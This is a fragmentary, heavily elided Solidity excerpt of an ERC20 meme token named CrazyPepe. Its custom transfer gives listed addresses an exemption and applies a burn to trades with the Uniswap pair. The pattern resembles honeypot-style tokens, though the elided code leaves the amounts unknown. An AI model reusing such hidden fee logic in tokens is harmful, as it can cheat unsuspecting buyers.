...
https://twitter.com/CrazyFrog_1000x
*/
...
contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    ...
    function _transfer_srtoken(address sender, address recipient, uint256 amount, uint256 amountToBurn) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
...
contract CrazyPepe is ERC20 {
    ...
    constructor(address router) ERC20(unicode"CrazyPepe", unicode"CRAZYPEPE", TOAL_SAILYLY) {
    ...
    function _transfer_hpei(
        ...
        if (!isException[from] && !isException[to]){
            ...
            if (from == uniswapV2Pair || to == uniswapV2Pair) {
                ...
                super._transfer_srtoken(from, to, amount, _burn);
                return;
            }
        }
